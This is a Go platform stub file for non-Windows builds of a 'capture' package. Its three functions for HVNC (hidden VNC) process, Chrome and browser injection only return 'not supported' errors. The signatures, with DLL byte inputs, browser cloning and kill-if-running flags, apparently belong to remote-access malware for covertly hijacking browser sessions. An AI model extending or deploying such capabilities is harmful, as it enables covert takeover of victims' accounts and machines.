//go:build !windows

package capture

import "errors"

func StartHVNCProcessInjected(filePath string, dllBytes []byte, captureDllBytes []byte, searchPath, replacePath string) error {
	return errors.New("HVNC injection not supported on this platform")
}

func StartHVNCChromeInjected(chromePath string, dllBytes []byte, captureDllBytes []byte) error {
	return errors.New("HVNC injection not supported on this platform")
}

type CloneProgressFunc func(percent int, copiedBytes, totalBytes int64, status string)
type DXGIStatusFunc func(success bool, gpuPID uint32, message string)

func StartHVNCBrowserInjected(browser string, exePath string, dllBytes []byte, captureDllBytes []byte, clone bool, cloneLite bool, killIfRunning bool, onProgress CloneProgressFunc, onDXGIStatus DXGIStatusFunc) error {
	return errors.New("HVNC injection not supported on this platform")
}
